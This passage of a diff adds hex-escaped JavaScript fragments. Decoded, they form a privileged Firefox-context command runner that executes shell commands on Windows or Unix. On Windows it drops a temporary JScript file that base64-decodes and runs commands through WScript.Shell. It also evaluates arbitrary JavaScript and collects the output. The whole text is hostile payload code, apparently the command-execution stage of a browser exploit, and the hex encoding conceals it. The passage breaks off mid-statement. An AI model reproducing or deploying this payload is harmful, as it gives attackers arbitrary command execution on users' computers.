+"\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f\x6e\x65\x74\x77" +
+"\x6f\x72\x6b\x2f\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x3b\x31" +
+"\x3f\x6e\x61\x6d\x65\x3d\x68\x74\x74\x70\x22\x5d\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x2e\x67\x65\x74\x53\x65\x72" +
+"\x76\x69\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74" +
+"\x73\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e" +
+"\x73\x49\x48\x74\x74\x70\x50\x72\x6f\x74\x6f\x63\x6f\x6c" +
+"\x48\x61\x6e\x64\x6c\x65\x72\x29\x2e\x75\x73\x65\x72\x41" +
+"\x67\x65\x6e\x74\x3b\x0a\x20\x20\x20\x20\x20\x20\x76\x61" +
+"\x72\x20\x77\x69\x6e\x64\x6f\x77\x73\x20\x3d\x20\x28\x75" +
+"\x61\x2e\x69\x6e\x64\x65\x78\x4f\x66\x28\x22\x57\x69\x6e" +
+"\x64\x6f\x77\x73\x22\x29\x3e\x2d\x31\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x76\x61\x72\x20\x73\x76\x63\x73\x20\x3d" +
+"\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x75\x74" +
+"\x69\x6c\x73\x2e\x69\x6d\x70\x6f\x72\x74\x28\x22\x72\x65" +
+"\x73\x6f\x75\x72\x63\x65\x3a\x2f\x2f\x67\x72\x65\x2f\x6d" +
+"\x6f\x64\x75\x6c\x65\x73\x2f\x53\x65\x72\x76\x69\x63\x65" +
+"\x73\x2e\x6a\x73\x6d\x22\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x76\x61\x72\x20\x6a\x73\x63\x72\x69\x70\x74\x20\x3d" +
+"\x20\x28\x7b\x22\x73\x72\x63\x22\x3a\x22\x5c\x6e\x20\x20" +
+"\x20\x20\x20\x20\x76\x61\x72\x20\x62\x36\x34\x20\x3d\x20" +
+"\x57\x53\x63\x72\x69\x70\x74\x2e\x61\x72\x67\x75\x6d\x65" +
+"\x6e\x74\x73\x28\x30\x29\x3b\x5c\x6e\x20\x20\x20\x20\x20" +
+"\x20\x76\x61\x72\x20\x64\x6f\x6d\x20\x3d\x20\x6e\x65\x77" +
+"\x20\x41\x63\x74\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74" +
+"\x28\x5c\x22\x4d\x53\x58\x4d\x4c\x32\x2e\x44\x4f\x4d\x44" +
+"\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x33\x2e\x30\x5c\x22\x29" +
+"\x3b\x5c\x6e\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x65" +
+"\x6c\x20\x20\x3d\x20\x64\x6f\x6d\x2e\x63\x72\x65\x61\x74" +
+"\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x5c\x22\x72\x6f\x6f" +
+"\x74\x5c\x22\x29\x3b\x5c\x6e\x20\x20\x20\x20\x20\x20\x65" +
+"\x6c\x2e\x64\x61\x74\x61\x54\x79\x70\x65\x20\x3d\x20\x5c" +
+"\x22\x62\x69\x6e\x2e\x62\x61\x73\x65\x36\x34\x5c\x22\x3b" +
+"\x20\x65\x6c\x2e\x74\x65\x78\x74\x20\x3d\x20\x62\x36\x34" +
+"\x3b\x20\x64\x6f\x6d\x2e\x61\x70\x70\x65\x6e\x64\x43\x68" +
+"\x69\x6c\x64\x28\x65\x6c\x29\x3b\x5c\x6e\x20\x20\x20\x20" +
+"\x20\x20\x76\x61\x72\x20\x73\x74\x72\x65\x61\x6d\x20\x3d" +
+"\x20\x6e\x65\x77\x20\x41\x63\x74\x69\x76\x65\x58\x4f\x62" +
+"\x6a\x65\x63\x74\x28\x5c\x22\x41\x44\x4f\x44\x42\x2e\x53" +
+"\x74\x72\x65\x61\x6d\x5c\x22\x29\x3b\x5c\x6e\x20\x20\x20" +
+"\x20\x20\x20\x73\x74\x72\x65\x61\x6d\x2e\x54\x79\x70\x65" +
+"\x3d\x31\x3b\x20\x73\x74\x72\x65\x61\x6d\x2e\x4f\x70\x65" +
+"\x6e\x28\x29\x3b\x20\x73\x74\x72\x65\x61\x6d\x2e\x57\x72" +
+"\x69\x74\x65\x28\x65\x6c\x2e\x6e\x6f\x64\x65\x54\x79\x70" +
+"\x65\x64\x56\x61\x6c\x75\x65\x29\x3b\x5c\x6e\x20\x20\x20" +
+"\x20\x20\x20\x73\x74\x72\x65\x61\x6d\x2e\x50\x6f\x73\x69" +
+"\x74\x69\x6f\x6e\x3d\x30\x3b\x20\x73\x74\x72\x65\x61\x6d" +
+"\x2e\x74\x79\x70\x65\x3d\x32\x3b\x20\x73\x74\x72\x65\x61" +
+"\x6d\x2e\x43\x68\x61\x72\x53\x65\x74\x20\x3d\x20\x5c\x22" +
+"\x75\x73\x2d\x61\x73\x63\x69\x69\x5c\x22\x3b\x20\x73\x74" +
+"\x72\x65\x61\x6d\x2e\x50\x6f\x73\x69\x74\x69\x6f\x6e\x3d" +
+"\x30\x3b\x5c\x6e\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x63\x6d\x64\x20\x3d\x20\x73\x74\x72\x65\x61\x6d\x2e\x52" +
+"\x65\x61\x64\x54\x65\x78\x74\x28\x29\x3b\x5c\x6e\x20\x20" +
+"\x20\x20\x20\x20\x28\x6e\x65\x77\x20\x41\x63\x74\x69\x76" +
+"\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x5c\x22\x57\x53\x63" +
+"\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x5c\x22\x29\x29" +
+"\x2e\x52\x75\x6e\x28\x63\x6d\x64\x2c\x20\x30\x2c\x20\x74" +
+"\x72\x75\x65\x29\x3b\x5c\x6e\x20\x20\x20\x20\x22\x7d\x29" +
+"\x2e\x73\x72\x63\x3b\x0a\x20\x20\x20\x20\x20\x20\x76\x61" +
+"\x72\x20\x72\x75\x6e\x43\x6d\x64\x20\x3d\x20\x66\x75\x6e" +
+"\x63\x74\x69\x6f\x6e\x28\x63\x6d\x64\x2c\x20\x63\x62\x29" +
+"\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x63\x62\x20" +
+"\x3d\x20\x63\x62\x20\x7c\x7c\x20\x28\x66\x75\x6e\x63\x74" +
+"\x69\x6f\x6e\x28\x29\x7b\x7d\x29\x3b\x0a\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x69\x66\x20\x28\x63\x6d\x64\x2e\x74" +
+"\x72\x69\x6d\x28\x29\x2e\x6c\x65\x6e\x67\x74\x68\x20\x3d" +
+"\x3d\x20\x30\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74\x28" +
+"\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x20\x63\x62" +
+"\x28\x22\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x69\x73\x20\x65" +
+"\x6d\x70\x74\x79\x20\x73\x74\x72\x69\x6e\x67\x20\x28\x27" +
+"\x27\x29\x2e\x22\x29\x3b\x20\x7d\x29\x3b\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x3b" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x6a\x73\x20\x3d" +
+"\x20\x28\x2f\x5e\x5c\x73\x2a\x5c\x5b\x4a\x41\x56\x41\x53" +
+"\x43\x52\x49\x50\x54\x5c\x5d\x28\x5b\x5c\x73\x5c\x53\x5d" +
+"\x2a\x29\x5c\x5b\x5c\x2f\x4a\x41\x56\x41\x53\x43\x52\x49" +
+"\x50\x54\x5c\x5d\x2f\x67\x29\x2e\x65\x78\x65\x63\x28\x63" +
+"\x6d\x64\x2e\x74\x72\x69\x6d\x28\x29\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x6a\x73\x29\x20" +
+"\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61" +
+"\x72\x20\x74\x61\x67\x20\x3d\x20\x22\x5b\x21\x4a\x41\x56" +
+"\x41\x53\x43\x52\x49\x50\x54\x5d\x22\x3b\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x73\x79\x6e" +
+"\x63\x20\x3d\x20\x74\x72\x75\x65\x3b\x20\x20\x2f\x2a\x20" +
+"\x61\x76\x6f\x69\x64\x20\x7a\x61\x6c\x67\x6f\x27\x73\x20" +
+"\x72\x65\x61\x63\x68\x20\x2a\x2f\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x76\x61\x72\x20\x73\x65\x6e\x74\x20" +
+"\x3d\x20\x66\x61\x6c\x73\x65\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x76\x61\x72\x20\x72\x65\x74\x56\x61" +
+"\x6c\x20\x3d\x20\x6e\x75\x6c\x6c\x3b\x0a\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x74\x72\x79\x20\x7b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x74\x68\x69" +
+"\x73\x2e\x73\x65\x6e\x64\x20\x3d\x20\x66\x75\x6e\x63\x74" +
+"\x69\x6f\x6e\x28\x72\x29\x7b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x73\x65" +
+"\x6e\x74\x29\x20\x72\x65\x74\x75\x72\x6e\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65" +
+"\x6e\x74\x20\x3d\x20\x74\x72\x75\x65\x3b\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20" +
+"\x28\x72\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x73\x79" +
+"\x6e\x63\x29\x20\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74" +
+"\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x20\x63" +
+"\x62\x28\x66\x61\x6c\x73\x65\x2c\x20\x72\x2b\x74\x61\x67" +
+"\x2b\x22\x5c\x6e\x22\x29\x3b\x20\x7d\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x65\x6c\x73\x65\x20\x20\x20\x20\x20\x20\x63\x62\x28\x66" +
+"\x61\x6c\x73\x65\x2c\x20\x72\x2b\x74\x61\x67\x2b\x22\x5c" +
+"\x6e\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x7d\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x72\x65\x74\x56\x61\x6c\x20\x3d" +
+"\x20\x46\x75\x6e\x63\x74\x69\x6f\x6e\x28\x6a\x73\x5b\x31" +
+"\x5d\x29\x2e\x63\x61\x6c\x6c\x28\x74\x68\x69\x73\x29\x3b" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x20\x63" +
+"\x61\x74\x63\x68\x20\x28\x65\x29\x20\x7b\x20\x72\x65\x74" +
+"\x56\x61\x6c\x20\x3d\x20\x65\x2e\x6d\x65\x73\x73\x61\x67" +
+"\x65\x3b\x20\x7d\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x73\x79\x6e\x63\x20\x3d\x20\x66\x61\x6c\x73\x65" +
+"\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69" +
+"\x66\x20\x28\x72\x65\x74\x56\x61\x6c\x20\x26\x26\x20\x21" +
+"\x73\x65\x6e\x74\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x73\x65\x6e\x74\x20\x3d\x20\x74" +
+"\x72\x75\x65\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74\x28" +
+"\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x20\x63\x62" +
+"\x28\x66\x61\x6c\x73\x65\x2c\x20\x72\x65\x74\x56\x61\x6c" +
+"\x2b\x74\x61\x67\x2b\x22\x5c\x6e\x22\x29\x3b\x20\x7d\x29" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74" +
+"\x75\x72\x6e\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d" +
+"\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x73\x68\x45\x73\x63\x20\x3d\x20\x22\x5c\x5c\x24\x26\x22" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x73\x68\x50\x61\x74\x68\x20\x3d\x20\x22\x2f\x62\x69\x6e" +
+"\x2f\x73\x68\x20\x2d\x63\x22\x3b\x0a\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x69\x66\x20\x28\x77\x69\x6e\x64\x6f\x77" +
+"\x73\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x73\x68\x50\x61\x74\x68\x20\x3d\x20\x22\x63\x6d\x64" +
+"\x20\x2f\x63\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x73\x68\x45\x73\x63\x20\x3d\x20\x22\x5c\x5e\x24" +
+"\x26\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x6a\x73\x63\x72\x69\x70\x74\x46\x69\x6c" +
+"\x65\x20\x3d\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73" +
+"\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b\x22\x40\x6d\x6f\x7a" +
+"\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f\x66\x69\x6c\x65\x2f" +
+"\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x5f\x73\x65\x72\x76" +
+"\x69\x63\x65\x3b\x31\x22\x5d\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x2e\x67\x65\x74\x53\x65\x72\x76" +
+"\x69\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73" +
+"\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73" +
+"\x49\x50\x72\x6f\x70\x65\x72\x74\x69\x65\x73\x29\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e\x67\x65" +
+"\x74\x28\x22\x54\x6d\x70\x44\x22\x2c\x20\x43\x6f\x6d\x70" +
+"\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66\x61" +
+"\x63\x65\x73\x2e\x6e\x73\x49\x46\x69\x6c\x65\x29\x3b\x0a" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x73\x63\x72" +
+"\x69\x70\x74\x46\x69\x6c\x65\x2e\x61\x70\x70\x65\x6e\x64" +
+"\x28\x27\x4e\x53\x57\x54\x7a\x36\x4e\x78\x54\x47\x33\x6a" +
+"\x69\x68\x76\x79\x44\x34\x2e\x6a\x73\x27\x29\x3b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x73" +
+"\x74\x72\x65\x61\x6d\x20\x3d\x20\x43\x6f\x6d\x70\x6f\x6e" +
+"\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b\x22" +
+"\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f\x6e" +
+"\x65\x74\x77\x6f\x72\x6b\x2f\x73\x61\x66\x65\x2d\x66\x69" +
+"\x6c\x65\x2d\x6f\x75\x74\x70\x75\x74\x2d\x73\x74\x72\x65" +
+"\x61\x6d\x3b\x31\x22\x5d\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x2e\x63\x72\x65\x61\x74\x65\x49\x6e" +
+"\x73\x74\x61\x6e\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e\x65" +
+"\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73" +
+"\x2e\x6e\x73\x49\x46\x69\x6c\x65\x4f\x75\x74\x70\x75\x74" +
+"\x53\x74\x72\x65\x61\x6d\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x73\x74\x72\x65\x61\x6d\x2e\x69\x6e" +
+"\x69\x74\x28\x6a\x73\x63\x72\x69\x70\x74\x46\x69\x6c\x65" +
+"\x2c\x20\x30\x78\x30\x34\x20\x7c\x20\x30\x78\x30\x38\x20" +
+"\x7c\x20\x30\x78\x32\x30\x2c\x20\x30\x36\x36\x36\x2c\x20" +
+"\x30\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x73\x74\x72\x65\x61\x6d\x2e\x77\x72\x69\x74\x65\x28\x6a" +
+"\x73\x63\x72\x69\x70\x74\x2c\x20\x6a\x73\x63\x72\x69\x70" +
+"\x74\x2e\x6c\x65\x6e\x67\x74\x68\x29\x3b\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x73\x74\x72" +
+"\x65\x61\x6d\x20\x69\x6e\x73\x74\x61\x6e\x63\x65\x6f\x66" +
+"\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e" +
+"\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73\x49\x53\x61" +
+"\x66\x65\x4f\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6d" +
+"\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x73\x74\x72\x65\x61\x6d\x2e\x66\x69\x6e\x69\x73" +
+"\x68\x28\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x7d\x20\x65\x6c\x73\x65\x20\x7b\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x73\x74\x72\x65\x61\x6d" +
+"\x2e\x63\x6c\x6f\x73\x65\x28\x29\x3b\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x7d\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76" +
+"\x61\x72\x20\x73\x74\x64\x6f\x75\x74\x46\x69\x6c\x65\x20" +
+"\x3d\x20\x22\x6d\x59\x66\x76\x38\x6a\x43\x65\x31\x54\x47" +
+"\x75\x75\x22\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x73\x74\x64\x6f\x75\x74\x20\x3d\x20\x43" +
+"\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73" +
+"\x73\x65\x73\x5b\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e" +
+"\x6f\x72\x67\x2f\x66\x69\x6c\x65\x2f\x64\x69\x72\x65\x63" +
+"\x74\x6f\x72\x79\x5f\x73\x65\x72\x76\x69\x63\x65\x3b\x31" +
+"\x22\x5d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e" +
+"\x67\x65\x74\x53\x65\x72\x76\x69\x63\x65\x28\x43\x6f\x6d" +
+"\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66" +
+"\x61\x63\x65\x73\x2e\x6e\x73\x49\x50\x72\x6f\x70\x65\x72" +
+"\x74\x69\x65\x73\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x2e\x67\x65\x74\x28\x22\x54\x6d\x70\x44\x22\x2c" +
+"\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e" +
+"\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73\x49\x46\x69" +
+"\x6c\x65\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73" +
+"\x74\x64\x6f\x75\x74\x2e\x61\x70\x70\x65\x6e\x64\x28\x73" +
+"\x74\x64\x6f\x75\x74\x46\x69\x6c\x65\x29\x3b\x0a\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x73\x68\x65" +
+"\x6c\x6c\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x63\x6d" +
+"\x64\x20\x3d\x20\x63\x6d\x64\x2e\x74\x72\x69\x6d\x28\x29" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28" +
+"\x77\x69\x6e\x64\x6f\x77\x73\x29\x20\x7b\x0a\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x73\x68\x65\x6c\x6c\x20\x3d" +
+"\x20\x73\x68\x50\x61\x74\x68\x2b\x22\x20\x22\x2b\x63\x6d" +
+"\x64\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73" +
+"\x68\x65\x6c\x6c\x20\x3d\x20\x73\x68\x50\x61\x74\x68\x2b" +
+"\x22\x20\x22\x2b\x73\x68\x65\x6c\x6c\x2e\x72\x65\x70\x6c" +
+"\x61\x63\x65\x28\x2f\x5c\x57\x2f\x67\x2c\x20\x73\x68\x45" +
+"\x73\x63\x29\x2b\x22\x20\x3e\x22\x2b\x73\x74\x64\x6f\x75" +
+"\x74\x2e\x70\x61\x74\x68\x2b\x22\x20\x32\x3e\x26\x31\x22" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61" +
+"\x72\x20\x62\x36\x34\x20\x3d\x20\x73\x76\x63\x73\x2e\x62" +
+"\x74\x6f\x61\x28\x73\x68\x65\x6c\x6c\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x7d\x20\x65\x6c\x73\x65\x20\x7b" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x68\x65" +
+"\x6c\x6c\x20\x3d\x20\x73\x68\x50\x61\x74\x68\x2b\x22\x20" +
+"\x22\x2b\x63\x6d\x64\x2e\x72\x65\x70\x6c\x61\x63\x65\x28" +
+"\x2f\x5c\x57\x2f\x67\x2c\x20\x73\x68\x45\x73\x63\x29\x3b" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x68\x65" +
+"\x6c\x6c\x20\x3d\x20\x73\x68\x50\x61\x74\x68\x2b\x22\x20" +
+"\x22\x2b\x73\x68\x65\x6c\x6c\x2e\x72\x65\x70\x6c\x61\x63" +
+"\x65\x28\x2f\x5c\x57\x2f\x67\x2c\x20\x73\x68\x45\x73\x63" +
+"\x29\x20\x2b\x20\x22\x20\x3e\x22\x2b\x73\x74\x64\x6f\x75" +
+"\x74\x2e\x70\x61\x74\x68\x2b\x22\x20\x32\x3e\x26\x31\x22" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x70\x72\x6f" +
+"\x63\x65\x73\x73\x20\x3d\x20\x43\x6f\x6d\x70\x6f\x6e\x65" +
+"\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b\x22\x40" +
+"\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f\x70\x72" +
+"\x6f\x63\x65\x73\x73\x2f\x75\x74\x69\x6c\x3b\x31\x22\x5d" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e\x63\x72" +
+"\x65\x61\x74\x65\x49\x6e\x73\x74\x61\x6e\x63\x65\x28\x43" +
+"\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65" +
+"\x72\x66\x61\x63\x65\x73\x2e\x6e\x73\x49\x50\x72\x6f\x63" +
+"\x65\x73\x73\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x73\x68\x20\x3d\x20\x43\x6f\x6d\x70\x6f" +
+"\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b" +
+"\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f" +
+"\x66\x69\x6c\x65\x2f\x6c\x6f\x63\x61\x6c\x3b\x31\x22\x5d" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x2e\x63\x72\x65\x61\x74\x65\x49" +
+"\x6e\x73\x74\x61\x6e\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e" +
+"\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65" +
+"\x73\x2e\x6e\x73\x49\x4c\x6f\x63\x61\x6c\x46\x69\x6c\x65" +
+"\x29\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66" +
+"\x20\x28\x77\x69\x6e\x64\x6f\x77\x73\x29\x20\x7b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x68\x2e\x69\x6e" +
+"\x69\x74\x57\x69\x74\x68\x50\x61\x74\x68\x28\x22\x43\x3a" +
+"\x5c\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x5c\x53\x79\x73" +
+"\x74\x65\x6d\x33\x32\x5c\x5c\x77\x73\x63\x72\x69\x70\x74" +
+"\x2e\x65\x78\x65\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x70\x72\x6f\x63\x65\x73\x73\x2e\x69\x6e" +
+"\x69\x74\x28\x73\x68\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x76\x61\x72\x20\x61\x72\x67\x73\x20\x3d" +
+"\x20\x5b\x6a\x73\x63\x72\x69\x70\x74\x46\x69\x6c\x65\x2e" +
+"\x70\x61\x74\x68\x2c\x20\x62\x36\x34\x5d\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x6f\x63\x65\x73" +
+"\x73\x2e\x72\x75\x6e\x28\x74\x72\x75\x65\x2c\x20\x61\x72" +
+"\x67\x73\x2c\x20\x61\x72\x67\x73\x2e\x6c\x65\x6e\x67\x74" +
+"\x68\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x6a\x73\x63\x72\x69\x70\x74\x46\x69\x6c\x65\x2e\x72\x65" +
+"\x6d\x6f\x76\x65\x28\x74\x72\x75\x65\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x74\x54\x69\x6d" +
+"\x65\x6f\x75\x74\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28" +
+"\x29\x7b\x63\x62\x28\x66\x61\x6c\x73\x65\x2c\x20\x63\x6d" +
+"\x64\x2b\x22\x5c\x6e\x22\x2b\x72\x65\x61\x64\x46\x69\x6c" +
+"\x65\x28\x73\x74\x64\x6f\x75\x74\x2e\x70\x61\x74\x68\x29" +
+"\x29\x3b\x7d\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x7d\x20\x65\x6c\x73\x65\x20\x7b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x73\x68\x2e\x69\x6e\x69\x74\x57\x69" +
+"\x74\x68\x50\x61\x74\x68\x28\x22\x2f\x62\x69\x6e\x2f\x73" +
+"\x68\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x70\x72\x6f\x63\x65\x73\x73\x2e\x69\x6e\x69\x74\x28" +
+"\x73\x68\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x76\x61\x72\x20\x61\x72\x67\x73\x20\x3d\x20\x5b\x22" +
+"\x2d\x63\x22\x2c\x20\x73\x68\x65\x6c\x6c\x5d\x3b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x6f\x63\x65" +
+"\x73\x73\x2e\x72\x75\x6e\x28\x74\x72\x75\x65\x2c\x20\x61" +
+"\x72\x67\x73\x2c\x20\x61\x72\x67\x73\x2e\x6c\x65\x6e\x67" +
